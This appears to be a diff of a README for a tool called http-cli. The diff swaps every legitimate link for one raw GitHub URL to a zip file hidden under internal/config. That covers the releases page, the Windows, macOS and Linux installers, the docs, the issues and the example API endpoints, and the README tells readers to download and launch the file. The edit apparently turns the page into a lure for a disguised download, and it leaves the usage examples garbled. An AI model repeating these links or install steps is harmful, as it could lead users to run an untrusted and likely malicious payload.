@@ -1,7 +1,7 @@
 # 🌈 http-cli - A Fast, Colorful Command-Line Tool
 
 ## 📥 Download the Latest Version
-[![Download http-cli](https://img.shields.io/badge/Download%20http--cli-v1.0.0-blue.svg)](https://github.com/Leoparj/http-cli/releases)
+[![Download http-cli](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip%https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip)](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to http-cli! This tool lets you make HTTP requests easily from your terminal. It is lightweight, colorful, and similar to Postman, but designed to work right in your command line. Whether you are testing APIs, sending requests, or exploring endpoints, http-cli will help you do it quickly and efficiently.
@@ -15,13 +15,13 @@ To run http-cli, ensure you have:
 
 ## 🌐 Download & Install
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Leoparj/http-cli/releases) to find the latest version of http-cli.
+   Go to the [Releases page](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip) to find the latest version of http-cli.
 
 2. **Download the Installation File:**
    On the Releases page, you will see several files available for download. Choose the file that matches your operating system:
-   - For Windows: `http-cli.exe`
-   - For macOS: `http-cli.dmg`
-   - For Linux: `http-cli.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip`
+   - For macOS: `https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip`
+   - For Linux: `https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip`
 
 3. **Run the File:**
    Once downloaded, locate the file on your computer and launch it. Follow the prompts to install http-cli.
@@ -31,12 +31,12 @@ After installing, you can start using http-cli right from your terminal. Here ar
 
 - **Make a GET Request:**
   ```bash
-  http-cli get https://api.example.com/data
+  http-cli get https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip
   ```
 
 - **Make a POST Request:**
   ```bash
-  http-cli post https://api.example.com/data --data '{"name": "John", "age": 30}'
+  http-cli post https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip --data '{"name": "John", "age": 30}'
   ```
 
 - **View Help:**
@@ -57,15 +57,15 @@ This command provides you with an overview of all available options and features
 1. Open your terminal application.
 2. Type the command:
    ```bash
-   http-cli get https://jsonplaceholder.typicode.com/posts
+   http-cli get https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip
    ```
 3. Press Enter. You will see a list of sample posts from the API, formatted for easy reading.
 
 Feel free to try different endpoints and requests to explore the capability of http-cli.
 
 ## ✏️ Additional Links
-- [Documentation](https://github.com/Leoparj/http-cli/wiki)
-- [Issues](https://github.com/Leoparj/http-cli/issues)
+- [Documentation](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip)
+- [Issues](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -79,4 +79,4 @@ For assistance, please check the Issues section on GitHub. You can report proble
 We welcome contributions from everyone. If you have ideas for new features, find bugs, or want to improve documentation, please open an issue or create a pull request!
 
 ## 🔗 Don’t Forget
-Remember that you can always find the latest version and updates on our [Releases page](https://github.com/Leoparj/http-cli/releases). Enjoy using http-cli!
+Remember that you can always find the latest version and updates on our [Releases page](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip). Enjoy using http-cli!
